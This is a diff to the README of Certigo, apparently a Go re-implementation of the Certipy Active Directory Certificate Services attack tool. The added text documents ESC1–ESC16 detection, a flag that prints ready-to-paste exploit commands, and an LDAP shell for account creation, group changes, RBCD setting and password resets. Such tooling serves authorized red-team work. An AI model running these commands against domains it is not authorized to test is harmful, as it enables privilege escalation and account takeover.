@@ -1,8 +1,8 @@
 # Certigo
 
-A Go port of [Certipy](https://github.com/ly4k/Certipy) (based on `certipy-ad` v5.0.3). Active Directory Certificate Services enumeration and abuse in a single static binary.
+ADCS enumeration and exploitation tool in Go.
 
-Certigo covers the same twelve subcommands as Certipy, built on top of `gokrb5`, `go-ldap`, `go-msrpc`, and `go-pkcs12`. Everything compiles to a static binary with no cgo, so it cross-compiles cleanly to Linux, Windows, and macOS on amd64 and arm64.
+Certigo is a single static binary that enumerates Active Directory Certificate Services, detects ESC1 through ESC16 misconfigurations, and wires up the follow-on attacks (Shadow Credentials, Golden Certificate, PKINIT, NTLM relay, coercion, RBCD). Built on top of `gokrb5`, `go-ldap`, `go-msrpc`, and `go-pkcs12`. Pure Go, no cgo, cross-compiles to Linux, Windows, and macOS on amd64 and arm64.
 
 ## Install
 
@@ -60,20 +60,55 @@ Enumerate every AD CS CA and template in the forest and flag vulnerable template
 ```
 certigo find \
   -u alice -p Passw0rd -d corp.local \
-  --dc-host dc01.corp.local \
-  --format text
+  --dc-host dc01.corp.local
 ```
 
-Output formats:
+Progress output goes to stderr (`[*]` / `[+]` / `[!]`); the actual report goes to stdout.
 
-- `text`: human-readable grouping, one section per CA and one per template.
-- `json`: structured snake_case for downstream tooling.
-- `zip`: bundle with `certigo_find.txt`, `certigo_find.json`, per-CA `.crt`, per-template JSON.
-- `bloodhound`: BloodHound CE OpenGraph edges (`ADCSESC1`..`ADCSESC16`) plus resolved principal nodes.
+**Filters (compose freely):**
 
 ```
-certigo find ... --format bloodhound -o certigo.json
+--enabled        # only templates published on at least one CA
+--vulnerable     # only templates with at least one ESC finding
+--enrollable     # only templates the bound principal can enrol in
 ```
+
+`--enabled --vulnerable --enrollable` is the attack-ready shortlist.
+
+**Output formats:**
+
+- `--format text` (default) - full Certipy-style section dump with resolved SIDs, EKU names, policies.
+- `--format json` - structured output.
+- `--format zip` - bundle containing txt + json + per-CA `.crt` + per-template json.
+- `--format bloodhound` - BloodHound CE OpenGraph edges (`ADCSESC1`..`ADCSESC16`) plus resolved principal nodes.
+- `--short` (or `--format short`) - one-line-per-template table with `TEMPLATE / ENABLED / VULN / ENROLL / ESCs / PUBLISHED-ON`. Headers and status cells are colored when stdout is a tty.
+
+**Exploit hints:**
+
+```
+--vulnerable --howto
+```
+
+prints a ready-to-paste `To exploit, run:` command under each ESC finding.
+
+**LDAP transport:**
+
+```
+--scheme ldap | --scheme ldaps       # certipy-compatible flag
+--ldaps                              # alias
+--port 389|636
+--ldap-insecure                      # skip TLS verify
+```
+
+Plain LDAP bind auto-retries on `:636` with `InsecureSkipVerify=true` when the DC rejects the initial bind with `strongerAuthRequired` / `confidentialityRequired`.
+
+**Drop into an LDAP REPL:**
+
+```
+certigo find ... --ldap-shell
+```
+
+Runs the full enumeration first, then hands you an interactive shell bound as the current principal. See the `shell` section below.
 
 ### auth
 
@@ -93,6 +128,38 @@ certigo auth -u alice -d corp.local --dc-host dc01.corp.local \
   --pfx alice.pfx --pfx-password '' --out-ccache alice.ccache
 
 export KRB5CCNAME=$PWD/alice.ccache
+```
+
+**Drop straight into an LDAP shell bound as the cert's principal:**
+
+```
+certigo auth -u Administrator -d corp.local --dc-host dc01.corp.local \
+  --pfx admin.pfx --ldap-shell
+```
+
+Flow: PKINIT AS-REQ -> TGT written to ccache -> LDAPS GSSAPI bind using that TGT -> REPL. Works the same way `certipy auth -ldap-shell` does.
+
+### LDAP shell
+
+Available via `certigo find --ldap-shell` (after enumeration) or `certigo auth --ldap-shell` (after a PFX-based PKINIT auth).
+
+Commands:
+
+```
+help                                 list commands
+whoami
+search <ldap-filter> [attr1,attr2]   up to 10 results
+dn <sAMAccountName>                  resolve DN
+get <dn-or-sam>                      dump every attribute
+add_computer <name> <password>       create a computer account (MAQ abuse)
+add_user <name> <password>           create a user
+add_user_to_group <user> <group>
+set_rbcd <source-sam> <target-sam>   set msDS-AllowedToActOnBehalfOfOtherIdentity
+clear_rbcd <target-sam>
+change_password <user> <new-password>
+disable_account <user>
+enable_account <user>
+exit | quit
 ```
 
 ### cert
@@ -252,6 +319,6 @@ Everything else is feature-complete against Certipy v5.0.3. File an issue or a P
 
 MIT. See [LICENSE](LICENSE).
 
-## Acknowledgements
+## Credits
 
-Certigo is a direct port of [Oliver Lyak's Certipy](https://github.com/ly4k/Certipy). All original AD CS research credit belongs to the Certipy authors and to the SpecterOps "Certified Pre-Owned" paper.
+Certigo is heavily based on [Oliver Lyak's Certipy](https://github.com/ly4k/Certipy) and on the SpecterOps "Certified Pre-Owned" research (Will Schroeder and Lee Christensen). Subcommand shape, flag names, ESC detection logic, and output conventions all take directly from Certipy. All original AD CS research credit belongs to those authors; certigo just re-implements the tooling in Go so it can ship as a single static binary for red-team engagements.
